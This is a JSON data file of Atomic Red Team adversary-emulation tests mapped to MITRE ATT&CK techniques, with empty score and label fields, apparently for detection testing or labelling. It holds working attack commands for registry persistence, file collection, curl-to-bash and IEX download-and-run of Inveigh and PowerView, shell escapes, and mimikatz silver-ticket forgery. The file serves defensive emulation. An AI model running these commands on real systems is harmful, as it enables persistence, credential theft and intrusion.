        "Command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\" -Value \"C:\\Windows\\System32\\calc.exe\"\n",
        "Description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1096,
        "Command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" C:\\Windows\\System32\\calc.exe\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
        "Description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1097,
        "Command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", C:\\Windows\\explorer.exe\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n",
        "Description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1098,
        "Command": "secedit /import /db mytemplate.db /cfg \"$PathToAtomicsFolder\\T1547.001\\src\\regtemplate.ini\"\nsecedit /configure /db mytemplate.db\n",
        "Description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1099,
        "Command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"autocheck autoche *\" -Type MultiString\n",
        "Description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1100,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /f /v StartupPrograms /t REG_SZ /d \"calc\"\n",
        "Description": "When a users logs in to a computer via RDP,Windows will search for the key in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd registry\nBy default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1101,
        "Command": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"C:\\Program Files\\Internet Explorer\\iexplore.exe\"\n",
        "Description": "Microsoft allows users to define a custom boot verification program for those situations by creating the registry key “HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram” and setting the value of ImagePath to the path of boot verification program.Threat Actor\ncan abuse by creating this registry key and providing a malicious application to be executed during successful boot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1102,
        "Command": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f",
        "Description": "This atomic test add persistence taking advantage of the  Windows Context Menu [Hexacorn](https://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/)\nUser have to right click on the main screen or in the white space of the opened folder (e.g. Size Modify).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1103,
        "Command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection\n",
        "Description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1119",
        "Shell": "command_prompt"
    },
    {
        "ID": 1104,
        "Command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n",
        "Description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1119",
        "Shell": "powershell"
    },
    {
        "ID": 1105,
        "Command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n",
        "Description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1119",
        "Shell": "powershell"
    },
    {
        "ID": 1106,
        "Command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n",
        "Description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1119",
        "Shell": "command_prompt"
    },
    {
        "ID": 1107,
        "Command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n",
        "Description": "Creates and executes a simple sh script.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1108,
        "Command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n",
        "Description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1109,
        "Command": "chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\nbash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\n",
        "Description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1110,
        "Command": "chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh\nbash PathToAtomicsFolder/T1059.004/src/LinEnum.sh\n",
        "Description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1111,
        "Command": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n",
        "Description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1112,
        "Command": "echo $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n",
        "Description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1113,
        "Command": "cat /etc/shells \n",
        "Description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1114,
        "Command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n",
        "Description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1115,
        "Command": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n",
        "Description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1116,
        "Command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n",
        "Description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "bash"
    },
    {
        "ID": 1117,
        "Command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n",
        "Description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1118,
        "Command": "cd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash\nls -la /tmp/art.txt\\t  \n",
        "Description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1119,
        "Command": "uname -srm\n",
        "Description": "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1120,
        "Command": "awk 'BEGIN {system(\"/bin/sh &\")}'",
        "Description": "In awk the begin rule runs the first record without reading or interpreting it. This way a shell can be created and used to break out from restricted environments with the awk command.\nReference - https://gtfobins.github.io/gtfobins/awk/#shell",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1121,
        "Command": "echo '! exec \"/bin/sh &\"' | PERL_MM_USE_DEFAULT=1  cpan",
        "Description": "cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.\nReference - https://gtfobins.github.io/gtfobins/cpan/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1122,
        "Command": "busybox sh &",
        "Description": "BusyBox is a multi-call binary. A multi-call binary is an executable program that performs the same job as more than one utility program. It can be used to break out from restricted environments by spawning an interactive system shell. \nReference - https://gtfobins.github.io/gtfobins/busybox/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1123,
        "Command": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'",
        "Description": "emacs can be used to break out from restricted environments by spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.004",
        "Shell": "sh"
    },
    {
        "ID": 1124,
        "Command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n",
        "Description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.005",
        "Shell": "powershell"
    },
    {
        "ID": 1125,
        "Command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n\\t# Modify the ServiceDll value in the registry\n\\tSet-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n\\tWrite-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n\\tWrite-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}",
        "Description": "This atomic test simulates the modification of the ServiceDll value in HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.005",
        "Shell": "powershell"
    },
    {
        "ID": 1126,
        "Command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"\n",
        "Description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1216",
        "Shell": "command_prompt"
    },
    {
        "ID": 1127,
        "Command": "set comspec=%windir%\\System32\\calc.exe\ncscript %windir%\\System32\\manage-bde.wsf\n",
        "Description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1216",
        "Shell": "command_prompt"
    },
    {
        "ID": 1128,
        "Command": "kubectl create -f $PathtoAtomicsFolder/T1609/src/busybox.yaml -n default\n# wait 3 seconds for the instance to come up\nsleep 3\nkubectl exec -n default busybox -- uname\n",
        "Description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (“kubectl exec”). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using “kubectl exec”.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1609",
        "Shell": "bash"
    },
    {
        "ID": 1129,
        "Command": "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \"cat /tmp/output.txt\"\n",
        "Description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (“docker exec”). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using “docker exec”. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1609",
        "Shell": "bash"
    },
    {
        "ID": 1130,
        "Command": "pcalua.exe -a calc.exe\npcalua.exe -a C:\\Windows\\System32\\calc.exe\n",
        "Description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1202",
        "Shell": "command_prompt"
    },
    {
        "ID": 1131,
        "Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\n",
        "Description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1202",
        "Shell": "command_prompt"
    },
    {
        "ID": 1132,
        "Command": "conhost.exe \"notepad.exe\"\n",
        "Description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1202",
        "Shell": "command_prompt"
    },
    {
        "ID": 1133,
        "Command": "Scriptrunner.exe -appvscript \"C:\\Windows\\System32\\calc.exe\"",
        "Description": "The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting. Upon test execution, calc.exe should open\nReference: https://x.com/NickTyrer/status/914234924655312896",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1202",
        "Shell": "powershell"
    },
    {
        "ID": 1134,
        "Command": "# Copy command to clipboard\nSet-Clipboard -Value 'calc.exe'\n\n# Open Run dialog\nStart-Process -FilePath \"powershell\" -ArgumentList \"-c (New-Object -ComObject 'Shell.Application').FileRun()\" -WindowStyle Hidden\n\n# Wait for Run dialog to open\nStart-Sleep -Seconds 1\n\n# Paste command and execute\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.SendKeys]::SendWait('^v')\nStart-Sleep -Milliseconds 500\n[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')\n",
        "Description": "Simulates execution of commands via the Windows Run dialog (Win+R) by programmatically opening the Run dialog, \ncopying a command to clipboard, and automating the paste and execution. This generates artifacts in the RunMRU registry key,\nwhich is commonly abused by threat actors to execute malicious commands disguised as CAPTCHA verification steps.\nUpon execution, a test PowerShell command will be executed through the Run dialog.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1202",
        "Shell": "powershell"
    },
    {
        "ID": 1135,
        "Command": "Import-Module \"PathToAtomicsFolder/T1648/src/T1648-1/LambdaAttack.ps1\" -Force\n$access_key = \"\"\n$secret_key = \"\"\n$session_token = \"\"\n$aws_profile = \"\"\n$region = \"us-east-2\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region\nInvoke-Terraform -TerraformCommand init -TerraformDirectory \"PathToAtomicsFolder/T1648/src/T1648-1\"\nInvoke-Terraform -TerraformCommand apply -TerraformDirectory \"PathToAtomicsFolder/T1648/src/T1648-1\" -TerraformVariables @(\"profile=T1648-1\", \"region=$region\")\nInvoke-LambdaAttack -AWSProfile \"T1648-1\" -AWSRegion $region\n",
        "Description": "Modify an existing Lambda function to execute arbitrary code.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1648",
        "Shell": "powershell"
    },
    {
        "ID": 1136,
        "Command": "net time \\\\localhost\nw32tm /tz\n",
        "Description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "command_prompt"
    },
    {
        "ID": 1137,
        "Command": "Get-Date\n",
        "Description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "powershell"
    },
    {
        "ID": 1138,
        "Command": "date\n",
        "Description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "sh"
    },
    {
        "ID": 1139,
        "Command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n",
        "Description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "command_prompt"
    },
    {
        "ID": 1140,
        "Command": "time\n",
        "Description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "command_prompt"
    },
    {
        "ID": 1141,
        "Command": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\" /v TimeZoneKeyName\n",
        "Description": "Identify the Operating System Time Zone via registry with the reg.exe command.\nUpon execution, the system Time Zone will be shown.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1124",
        "Shell": "command_prompt"
    },
    {
        "ID": 1142,
        "Command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n\\tif ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n",
        "Description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.002",
        "Shell": "powershell"
    },
    {
        "ID": 1143,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
        "Description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1557.001",
        "Shell": "powershell"
    },
    {
        "ID": 1144,
        "Command": "gpresult /z\n",
        "Description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1615",
        "Shell": "command_prompt"
    },
    {
        "ID": 1145,
        "Command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
        "Description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
        "Score": null,
        "GoodOrBad": null,
